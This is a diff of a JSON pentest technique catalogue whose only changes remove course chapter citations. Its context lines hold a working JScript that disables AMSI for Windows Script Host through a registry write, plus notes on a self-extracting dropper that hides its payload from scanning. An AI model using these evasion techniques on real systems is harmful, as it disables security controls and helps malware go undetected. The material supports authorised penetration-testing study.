@@ -19,7 +19,7 @@
       ],
       "command": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
       "variables": [],
-      "notes": "Syntax:\nSave as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains.\n\nPersistent (survives reboot) - good and bad.\n\nRemember to clean up.\n\nSee also:\namsi-jscript-registry in amsi-bypass module.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry, PEN-300 Chapter 7.6.2 Manual alternative:\nExecute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET",
+      "notes": "Syntax:\nSave as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains.\n\nPersistent (survives reboot) - good and bad.\n\nRemember to clean up.\n\nSee also:\namsi-jscript-registry in amsi-bypass module.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry Manual alternative:\nExecute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET",
       "success_indicators": [
         "Registry key set to 0. AMSI disabled for current user's WSH sessions. Persists across reboots."
       ],
@@ -58,7 +58,7 @@
           "required": true
         }
       ],
-      "notes": "Syntax:\nCreate JScript dropper, append payload after marker, save as .js Creative evasion technique.\n\nInitial scan sees benign dropper.\n\nPayload extracted at runtime.\n\nGood for embedding PowerShell scripts or small executables.\n\nTest marker uniqueness.\n\n~20 min to implement.\n\nTime estimate:\n20 minutes References:\ndocs/av-evasion/jscript-evasion.md#self-modifying, PEN-300 Chapter 7.6.3 Manual alternative:\nUse HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders",
+      "notes": "Syntax:\nCreate JScript dropper, append payload after marker, save as .js Creative evasion technique.\n\nInitial scan sees benign dropper.\n\nPayload extracted at runtime.\n\nGood for embedding PowerShell scripts or small executables.\n\nTest marker uniqueness.\n\n~20 min to implement.\n\nTime estimate:\n20 minutes References:\ndocs/av-evasion/jscript-evasion.md#self-modifying Manual alternative:\nUse HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders",
       "success_indicators": [
         "JScript reads itself, extracts embedded payload, writes to temp, executes. Initial AMSI scan only sees dropper code."
       ],
